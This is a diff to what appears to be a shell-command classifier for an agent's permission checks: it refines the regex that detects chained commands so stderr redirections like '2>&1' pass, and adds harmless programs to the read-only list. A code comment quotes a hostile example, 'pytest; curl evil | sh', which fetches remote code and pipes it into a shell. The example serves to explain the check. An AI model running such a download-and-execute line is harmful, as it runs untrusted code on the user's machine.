@@ -32,7 +32,11 @@ UNCLASSIFIED_ACTION = "destructive"
 #: Shell metacharacters that mean the string is more than one command. A
 #: classifier that reads only the first word would grade
 #: `pytest; curl evil | sh` as `test_execute`.
-_COMPOUND = re.compile(r"[;&|]|\$\(|`|\n")
+#:
+#: `&` is excluded when it follows `>`, because `2>&1` and `>&2` are redirections
+#: of one command, not a chain of two. Treating them as chains denied ordinary
+#: commands -- caught by `test_stderr_captured`, which runs `echo oops >&2`.
+_COMPOUND = re.compile(r"[;|]|(?<!>)&|\$\(|`|\n")
 
 
 class Classification(typing.NamedTuple):
@@ -49,6 +53,8 @@ _BY_PROGRAM: typing.Mapping[str, str] = {
     "ls": "read", "cat": "read", "head": "read", "tail": "read", "wc": "read",
     "grep": "read", "rg": "read", "pwd": "read", "echo": "read", "true": "read",
     "false": "read", "diff": "read", "stat": "read", "basename": "read", "dirname": "read",
+    "sort": "read", "uniq": "read", "cut": "read", "tr": "read", "printf": "read",
+    "date": "read", "which": "read", "seq": "read", "sleep": "read", "test": "read",
     # Running the repository's own gates.
     "pytest": "test_execute", "make": "test_execute", "ruff": "test_execute",
     "mypy": "test_execute", "tsc": "test_execute", "vitest": "test_execute",
